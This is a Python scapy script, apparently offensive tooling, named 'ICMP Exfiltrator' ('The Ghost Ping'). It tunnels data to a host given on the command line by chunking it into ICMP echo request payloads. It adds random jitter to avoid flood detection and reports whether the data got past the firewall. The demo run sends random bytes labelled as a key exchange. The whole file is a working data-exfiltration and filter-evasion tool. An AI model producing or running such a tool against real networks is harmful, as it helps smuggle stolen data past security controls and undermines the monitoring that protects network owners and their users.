#!/usr/bin/env python3
import sys
import time
import argparse
import random
import socket
import logging
from scapy.all import IP, ICMP, send, sr1, conf

# --- CONTEXT: ICMP EXFILTRATOR V1.0 (THE GHOST PING) ---
# SYSTEM_DIRECTIVE: Bypass Protocol Filters by tunneling via ICMP.
# TECHNIQUE: Payload Encapsulation in Echo Request Data Field.

conf.verb = 0
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

class IcmpExfiltrator:
    def __init__(self, target_host):
        self.target_host = target_host
        self.target_ip = socket.gethostbyname(target_host)
        self.id = random.randint(1000, 65535)
        self.seq = 1
        print(f"[+] IcmpExfiltrator Initialized. Target: {target_host} ({self.target_ip})")

    def _get_chunked_payload(self, data, size=32):
        """Splits data into chunks that fit in a standard Ping payload."""
        for i in range(0, len(data), size):
            yield data[i:i+size]

    def tunnel(self, real_data):
        print(f"[*] Tunneling {len(real_data)} bytes via ICMP Echo Requests...")
        
        # Add a magic header so the server knows it's a tunnel
        # In a real scenario, this would be encrypted.
        magic_header = b"\xDE\xAD\xBE\xEF"
        full_payload = magic_header + real_data
        
        chunk_count = 0
        success_count = 0
        
        for chunk in self._get_chunked_payload(full_payload, size=48):
            # Construct ICMP Echo Request
            # Type 8 (Echo Request), Code 0
            # ID identifies the session, Seq identifies the chunk
            pkt = IP(dst=self.target_ip)/ICMP(type=8, code=0, id=self.id, seq=self.seq)/chunk
            
            # Send and wait for Echo Reply (Type 0)
            # The reply confirms the server received the chunk
            ans = sr1(pkt, timeout=1.5, verbose=0)
            
            if ans and ans.haslayer(ICMP) and ans[ICMP].type == 0:
                success_count += 1
                # print(f"    [+] Chunk {self.seq} delivered. RTT: {(ans.time - pkt.sent_time) * 1000:.2f}ms")
            else:
                print(f"    [!] Chunk {self.seq} lost/dropped.")
            
            self.seq += 1
            chunk_count += 1
            
            # Jitter to avoid flood detection
            time.sleep(random.uniform(0.05, 0.15))

        success_rate = (success_count / chunk_count) * 100
        print("\n" + "="*60)
        print("  ICMP EXFILTRATOR: TUNNEL REPORT")
        print("="*60)
        print(f"TARGET: {self.target_ip}")
        print(f"PACKETS SENT: {chunk_count}")
        print(f"PACKETS ACKNOWLEDGED: {success_count}")
        print(f"TUNNEL INTEGRITY: {success_rate:.1f}%")
        
        if success_rate > 90:
            print("STATUS: [!] GHOST CHANNEL ACTIVE. Data passed through the firewall.")
        else:
            print("STATUS: [X] BLOCKED. ICMP Payload Inspection active.")
        print("="*60 + "\n")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="IcmpExfiltrator: ICMP Tunneling")
    parser.add_argument("target", help="Target domain (e.g., torproject.org)")
    args = parser.parse_args()

    tunnel = IcmpExfiltrator(args.target)
    # Simulate a small encrypted key exchange
    fake_key = random.randbytes(128)
    tunnel.tunnel(fake_key)
